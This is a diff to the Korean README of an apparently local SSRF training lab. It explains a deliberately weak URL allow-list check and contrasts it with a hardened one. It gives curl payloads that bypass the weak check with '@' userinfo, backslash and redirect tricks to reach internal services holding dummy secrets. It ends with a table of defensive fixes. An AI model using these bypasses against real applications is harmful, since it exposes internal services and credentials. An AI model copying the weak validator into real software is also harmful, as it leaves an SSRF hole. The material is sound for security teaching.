@@ -12,7 +12,9 @@
 ├── docker-compose.yml       # 전체 실습 환경 정의
 ├── Dockerfile.target        # 취약한 타깃 앱 이미지
 ├── app/
-│   └── vuln_app.py          # 취약한 Flask 앱 소스
+│   ├── vuln_app.py          # 취약한 Flask 앱 소스
+│   └── templates/
+│       └── index.html       # 웹 UI
 └── README.md
 ```
 
@@ -38,8 +40,11 @@ cd sec-lab/ssrf-url-parser-confusion
 # 2. 빌드 & 실행
 docker compose up -d --build
 
-# 3. 동작 확인
-curl http://localhost:5000/fetch-weak?url=http://httpbin.org/get
+# 3. 웹 UI 접속
+# 브라우저에서 http://localhost:5000 열기
+
+# 또는 curl로 동작 확인
+curl "http://localhost:5000/fetch-weak?url=http://evil.com/"
 ```
 
 ---
@@ -65,10 +70,37 @@ curl http://localhost:5000/fetch-weak?url=http://httpbin.org/get
 ```
 
 | 컨테이너 | 포트 | 역할 |
-|----------|------|------|
+|---|---|---|
 | `target` | 5000 | 취약한 Flask 앱. 공격 대상 |
 | `internal-api` | 8080 (내부만) | 외부에서 직접 접근 불가한 비밀 서비스 |
 | `attacker-redirector` | 9000 | 302로 internal-api로 리다이렉트하는 공격자 서버 시뮬레이션 |
+
+---
+
+## 취약점 원리
+
+### `is_safe_weak` — 취약한 WAF 패턴
+
+```python
+def is_safe_weak(url: str) -> bool:
+    parsed = urlparse(url)
+    domain = parsed.netloc          # @ · \ 포함한 전체 문자열
+    return any(d in domain for d in ALLOWED_DOMAINS)  # "포함" 여부만 확인
+```
+
+`urlparse().netloc`은 `userinfo@host:port` 전체를 반환합니다.  
+`in` 검사만 하면 netloc 어딘가에 허용 도메인이 있기만 해도 통과되므로 `@`, `\` 트릭으로 우회됩니다.
+
+### `is_safe_strong` — 안전한 패턴
+
+```python
+host = parsed.hostname   # @ 이후 실제 호스트만 추출
+```
+
+- `hostname`은 userinfo를 제거한 실제 호스트만 반환
+- 백슬래시 명시 차단
+- DNS 해석 후 사설 IP 대역 차단
+- `allow_redirects=False`
 
 ---
 
@@ -79,57 +111,89 @@ curl http://localhost:5000/fetch-weak?url=http://httpbin.org/get
 ```bash
 # 정상 차단 확인
 curl "http://localhost:5000/fetch-weak?url=http://evil.com/"
-# 예상 결과: {"error": "Blocked by WAF"}
+# → {"error": "Blocked by WAF"}
 
-# 허용된 도메인 (실제로 없는 도메인이라 연결 오류 발생)
+# 허용된 도메인 (실제 DNS 없어 연결 오류)
 curl "http://localhost:5000/fetch-weak?url=https://images.example.com/"
 ```
 
-### 실습 1 — `@` (유저인포) Parser Confusion
+---
 
-```bash
-# WAF는 netloc에서 images.example.com을 보고 통과시키지만
-# requests는 @ 뒤인 localhost:5000으로 접속합니다
-curl "http://localhost:5000/fetch-weak?url=https://images.example.com@localhost:5000/internal-secret"
+### 실습 1 — `@` (Userinfo) Parser Confusion
 
-# 예상 결과:
-# {"status": 200, "body": "{\"aws_access_key\": \"AKIAIOSFODNN7EXAMPLE\", ...}"}
+WAF는 `netloc`에서 `images.example.com`을 보고 통과시키지만,  
+`requests`는 `@` 뒤의 실제 호스트(`localhost:5000`)로 접속합니다.
+
+```
+URL:  https://images.example.com@localhost:5000/internal-secret
+                     │                    │
+              WAF가 보는 값        requests가 접속하는 곳
 ```
 
-### 실습 2 — 백슬래시(`\`) Parser Confusion
+```bash
+curl "http://localhost:5000/fetch-weak?url=https://images.example.com@localhost:5000/internal-secret"
+# → {"status": 200, "body": "{\"aws_access_key\": \"AKIAIOSFODNN7EXAMPLE\", ...}"}
+```
+
+---
+
+### 실습 2 — `\` (백슬래시) Parser Confusion
+
+`urlparse`는 `\`를 경로 구분자로 보지 않아 netloc 전체에 포함시키지만,  
+urllib3는 `\` 앞까지만 호스트로 파싱합니다.
 
 ```bash
-# urlparse는 netloc에 images.example.com\localhost:5000 전체를 담지만
-# urllib3는 백슬래시 앞 images.example.com 으로만 접속을 시도합니다
-# (실제 DNS가 없어 오류 — 실전에서는 내 서버 도메인을 사용합니다)
 curl "http://localhost:5000/fetch-weak?url=https://images.example.com\\localhost:5000/internal-secret"
 ```
 
+> 실제 DNS가 없어 연결 오류 발생. 실전에서는 `images.example.com` 자리에 자신이 소유한 도메인을 사용합니다.
+
+---
+
 ### 실습 3 — 302 리다이렉트 우회
 
-```bash
-# attacker-redirector(9000)는 302로 internal-api(8080)로 리다이렉트합니다
-# target이 리다이렉트를 자동으로 따라가면서 내부 서비스 데이터를 반환합니다
+`fetch-weak`는 `allow_redirects=True`(기본값)라서 302 응답을 자동으로 추적합니다.  
+WAF는 최초 URL만 검사하므로 리다이렉트 목적지는 검사하지 않습니다.
 
+```
+요청 → attacker-redirector:9000
+         └→ 302 Location: http://internal-api:8080/
+              └→ target이 자동 추적 → 내부 데이터 반환
+```
+
+```bash
 # 리다이렉터 동작 확인
 curl -v http://localhost:9000/
 # → HTTP/1.0 302  Location: http://internal-api:8080/
 
-# @ 트릭으로 WAF 우회 + 리다이렉터 조합
+# @ 트릭 + 리다이렉터 조합
 curl "http://localhost:5000/fetch-weak?url=https://images.example.com@localhost:9000/"
-
-# 예상 결과:
-# {"status": 200, "body": "{\"access\": \"INTERNAL_ONLY\", ...}"}
+# → {"status": 200, "body": "{\"access\": \"INTERNAL_ONLY\", \"db_password\": \"sup3r_s3cr3t_pw\", ...}"}
 ```
+
+---
 
 ### 안전한 엔드포인트와 비교
 
 ```bash
-# /fetch-strong 은 hostname 기반 검증 + allow_redirects=False
-# 같은 페이로드를 넣어도 차단됩니다
+# 같은 페이로드 → 전부 차단
 curl "http://localhost:5000/fetch-strong?url=https://images.example.com@localhost:5000/internal-secret"
-# 예상 결과: {"error": "Blocked by WAF"}
+# → {"error": "Blocked by WAF"}
+
+curl "http://localhost:5000/fetch-strong?url=https://images.example.com@localhost:9000/"
+# → {"error": "Blocked by WAF"}
 ```
+
+---
+
+## 방어 포인트 정리
+
+| 취약 패턴 | 안전 패턴 |
+|---|---|
+| `urlparse().netloc` + `in` 검사 | `urlparse().hostname` 사용 |
+| 백슬래시 미처리 | `"\\" in url` 명시 차단 |
+| `allow_redirects=True` | `allow_redirects=False` |
+| 도메인 문자열 비교만 | DNS 해석 후 사설 IP 대역 차단 |
 
 ---
 
